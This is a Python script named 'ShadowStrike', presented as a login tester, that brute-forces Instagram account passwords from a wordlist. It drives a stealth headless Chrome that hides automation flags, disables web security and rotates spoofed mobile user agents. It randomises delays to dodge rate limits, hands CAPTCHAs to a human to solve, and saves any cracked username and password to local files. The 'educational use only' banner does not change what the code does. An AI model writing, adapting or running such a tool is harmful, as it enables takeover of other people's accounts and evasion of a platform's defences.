import undetected_chromedriver as uc
import time, random, json, os
from datetime import datetime
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# === Banner Branding ===
def banner():
    print("\033[1;91m" + r"""
  _________.__               .__                _________ __                __          
 /   _____/|__| ____ _____  _|__| ____   ____   \_   ___ \\__| ____   ____ |  | __ ____ 
 \_____  \ |  |/    \\__  \|  |/ __ \ /    \  /    \  \/|  |/ __ \_/ __ \|  |/ // __ \
 /        \|  |   |  \/ __ \| \  ___/|   |  \ \     \___|  \  ___/\  ___/|    <\  ___/
/_______  /|__|___|  (____  /_|\___  >___|  /  \______  /__|\___  >\___  >__|_ \\___  >
        \/         \/     \/        \/     \/          \/        \/     \/     \/    \/ 
""" + "\033[0m")
    print("\033[1;92m:: ShadowStrike :: Modular Chrome Login Tester")
    print(":: Author: Shreeparna")
    print(":: For educational use only ::" + "\033[0m\n")

# === Stealth Browser Launcher ===
def launch_browser(headless=True):
    options = uc.ChromeOptions()
    if headless:
        options.add_argument("--headless=new")
    options.add_argument("--incognito")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--window-size=360,640")
    options.add_argument("--lang=en-US")
    options.add_argument("--disable-web-security")
    options.add_argument("--disable-features=IsolateOrigins,site-per-process")
    options.add_argument("--disable-webrtc")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    browser = uc.Chrome(options=options, use_subprocess=True)
    ua = random.choice([
        "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; ONEPLUS A6010) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36"
    ])
    browser.execute_cdp_cmd("Network.setUserAgentOverride", {"userAgent": ua})
    browser.delete_all_cookies()
    log_fingerprint(ua)
    return browser

# === Fingerprint Logger ===
def log_fingerprint(user_agent):
    os.makedirs("fingerprints", exist_ok=True)
    log = {
        "user_agent": user_agent,
        "timestamp": datetime.now().isoformat(),
        "viewport": "360x640",
        "lang": "en-US",
        "stealth_flags": [
            "--headless=new",
            "--incognito",
            "--disable-blink-features=AutomationControlled",
            "--disable-webrtc"
        ]
    }
    filename = f"fingerprints/fp_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(log, f)


# === CAPTCHA Detection ===
def detect_captcha(browser):
    try:
        captcha_iframes = browser.find_elements(By.CSS_SELECTOR, "iframe[src*='captcha']")
        security_checks = browser.find_elements(By.CSS_SELECTOR, "[aria-label='Security Check']")
        if captcha_iframes or security_checks:
            print("\033[1;93m[!] CAPTCHA detected. Manual solve required.\033[0m")
            return True
        else:
            print("\033[1;94m[+] No CAPTCHA detected.\033[0m")
            return False
    except Exception as e:
        print(f"[!] CAPTCHA check error: {e}")
        return False

# === Session Saver ===
def save_session(username, password):
    os.makedirs("sessions", exist_ok=True)
    session = {
        "username": username,
        "password": password,
        "timestamp": datetime.now().isoformat()
    }
    filename = f"sessions/session_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(session, f)
    print(f"[+] Session saved to {filename}")

# === Session Cache Check ===
def is_session_cached(username):
    session_dir = "sessions"
    if not os.path.isdir(session_dir):
        return False
    for file in os.listdir(session_dir):
        if file.startswith(f"session_{username}_") and file.endswith(".json"):
            print(f"\033[1;96m[+] Cached session found: {file}\033[0m")
            return True
    return False

# === Login Attempt ===
def login_attempt(username, password):
    browser = launch_browser(headless=True)
    browser.get("https://www.instagram.com/accounts/login/")
    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        browser.find_element(By.NAME, "username").send_keys(username)
        time.sleep(random.uniform(1, 2))
        browser.find_element(By.NAME, "password").send_keys(password)
        time.sleep(random.uniform(1, 2))
        browser.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
        time.sleep(random.uniform(5, 7))

        if detect_captcha(browser):
            browser.quit()
            print("\033[1;93m[!] CAPTCHA detected. Launching visible browser for manual solve...\033[0m")
            visible_browser = launch_browser(headless=False)
            visible_browser.get("https://www.instagram.com/accounts/login/")
            WebDriverWait(visible_browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
            visible_browser.find_element(By.NAME, "username").send_keys(username)
            visible_browser.find_element(By.NAME, "password").send_keys(password)
            print("\033[1;96m[✓] Please solve the CAPTCHA manually. Press Enter here when done.\033[0m")
            input(">> ")
            time.sleep(5)
            page = visible_browser.page_source
            if "logged_in_user" in page:
                print(f"\033[1;92m✅ Success: {password}\033[0m")
                save_session(username, password)
                visible_browser.quit()
                return "success"
            else:
                print(f"[-] Failed after manual solve: {password}")
                visible_browser.quit()
                return "fail"

        page = browser.page_source
        if "logged_in_user" in page:
            print(f"\033[1;92m✅ Success: {password}\033[0m")
            save_session(username, password)
            browser.quit()
            return "success"
        else:
            print(f"[-] Failed: {password}")
            browser.quit()
            return "fail"

    except Exception as e:
        print(f"[!] Error: {e}")
        browser.quit()
        return "error"
# === Multi-Password Test ===
def multi_password_test(username, wordlist_path):
    if is_session_cached(username):
        print("\033[1;92m[✓] Skipping brute-force: session already cached.\033[0m")
        return

    if not os.path.isfile(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        return

    with open(wordlist_path, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    for password in passwords:
        result = login_attempt(username, password)
        if result == "success":
            break
        elif result == "captcha":
            time.sleep(random.uniform(60, 120))
        else:
            time.sleep(random.uniform(5, 10))

# === Command Dispatcher ===
def handle_command(cmd, args):
    if cmd == "login_test":
        return login_attempt(args["username"], args["password"])
    elif cmd == "multi_test":
        return multi_password_test(args["username"], args["wordlist"])
    else:
        print(f"[!] Unknown command: {cmd}")

# === Entry Point ===
if __name__ == "__main__":
    banner()
    username = input("Instagram username: ").strip()
    wordlist = input("Path to password list (.txt): ").strip()
    handle_command("multi_test", {"username": username, "wordlist": wordlist})


